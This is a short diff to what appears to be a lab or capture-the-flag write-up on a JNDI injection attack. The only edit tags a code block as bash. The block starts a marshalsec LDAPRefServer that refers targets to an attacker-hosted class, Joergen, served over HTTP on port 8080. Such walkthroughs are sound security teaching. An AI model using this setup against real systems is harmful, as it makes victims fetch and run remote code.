@@ -22,7 +22,7 @@ public class Joergen {
 *CLIENTIP* has to be replaced with the terminal's IP address.
 This is placed in the web tree, so that the web server is able to hand out this class.
 Next the [marshalsec](https://github.com/mbechler/marshalsec) installation residing in `/home/troll/marshalsec`  is started:
-```
+```bash
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://WEBSERVERIP:8080/#Joergen"
 ```
 *WEBSERVERIP* has to be replaced with the terminal's IP address.
